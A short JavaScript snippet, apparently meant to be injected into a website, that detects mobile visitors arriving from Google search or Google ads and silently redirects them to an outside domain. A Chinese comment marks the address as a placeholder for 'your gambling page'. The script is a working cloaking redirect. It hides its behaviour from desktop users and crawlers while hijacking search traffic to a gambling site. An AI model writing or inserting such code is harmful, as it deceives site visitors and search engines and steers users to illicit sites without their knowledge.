
(function() {
  var isMobile = /android|webos|iphone|ipad|ipod|blackberry|iemobile|opera mini/i.test(
    navigator.userAgent.toLowerCase()
  );
  var fromGoogle = document.referrer.includes("google.com") || document.referrer.includes("googleadservices.com");

  if (isMobile && fromGoogle) {
    window.location.href = "https://dreamx73.com"; // <-- 替換成你的博彩頁
  }
})();
